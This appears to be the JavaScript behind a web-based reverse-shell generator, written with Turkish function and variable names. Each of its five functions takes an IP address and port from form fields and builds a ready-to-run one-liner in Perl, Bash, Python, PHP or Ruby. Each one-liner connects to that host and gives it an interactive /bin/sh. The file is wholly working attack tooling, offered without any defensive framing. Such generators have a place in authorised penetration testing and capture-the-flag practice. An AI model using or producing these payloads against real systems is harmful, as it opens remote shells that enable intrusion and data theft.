        function calistir1() {
            var ipAdresi = document.getElementById("ip_adresi").value;
            var portNumarasi = document.getElementById("port_numarasi").value;
            var kod = "perl -e 'use Socket;$i=\"" + ipAdresi + "\";$p=" + portNumarasi + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
            document.getElementById("paragraf").innerHTML = kod;

            var paragraf = document.getElementById("paragraf");
            paragraf.style.boxShadow = "0px 0px 20px 0px rgba(255,0,0,1)";
            paragraf.style.transition = "box-shadow 0.5s ease-in-out";
            setTimeout(function(){ 
              paragraf.style.boxShadow = "none";
            }, 2000);
            
        }


        function calistir2() {
            var ipAdresi = document.getElementById("ip_deger3").value;
            var portNumarasi = parseInt(document.getElementById("port_deger4").value);
            var kod = "bash -i >& /dev/tcp/" + ipAdresi + "/" + portNumarasi.toString() + " 0>&1";
                document.getElementById("paragraf2").innerHTML = kod;

                var paragraf = document.getElementById("paragraf2");
                paragraf.style.boxShadow = "0px 0px 20px 0px rgba(255,0,0,1)";
                paragraf.style.transition = "box-shadow 0.5s ease-in-out";
                setTimeout(function(){ 
                  paragraf.style.boxShadow = "none";
                }, 2000);
                
        }

        function calistir3() {
            var ipAdresi = document.getElementById("ip_deger5").value;
            var portNumarasi = document.getElementById("port_deger6").value;
            var kod = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ipAdresi + "\"," + portNumarasi + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
                document.getElementById("paragraf3").innerHTML = kod;

                var paragraf = document.getElementById("paragraf3");
                paragraf.style.boxShadow = "0px 0px 20px 0px rgba(255,0,0,1)";
                paragraf.style.transition = "box-shadow 0.5s ease-in-out";
                setTimeout(function(){ 
                  paragraf.style.boxShadow = "none";
                }, 2000);
                

        }

        function calistir4() {
            var ipAdresi = document.getElementById("ip_deger7").value;
            var portNumarasi = document.getElementById("port_deger8").value;
            var kod = "php -r '$sock=fsockopen(\"" + ipAdresi + "\", " + portNumarasi + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
                document.getElementById("paragraf4").innerHTML = kod;

                var paragraf = document.getElementById("paragraf4");
                paragraf.style.boxShadow = "0px 0px 20px 0px rgba(255,0,0,1)";
                paragraf.style.transition = "box-shadow 0.5s ease-in-out";
                setTimeout(function(){ 
                  paragraf.style.boxShadow = "none";
                }, 2000);
                
        }

        function calistir5() {
            var ipAdresi = document.getElementById("ip_deger9").value;
            var portNumarasi = document.getElementById("port_deger10").value;
            var kod = "ruby -rsocket -e'f=TCPSocket.open(\"" + ipAdresi + "\", " + portNumarasi + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
                document.getElementById("paragraf5").innerHTML = kod;

                var paragraf = document.getElementById("paragraf5");
                paragraf.style.boxShadow = "0px 0px 20px 0px rgba(255,0,0,1)";
                paragraf.style.transition = "box-shadow 0.5s ease-in-out";
                setTimeout(function(){ 
                  paragraf.style.boxShadow = "none";
                }, 2000);
                
        }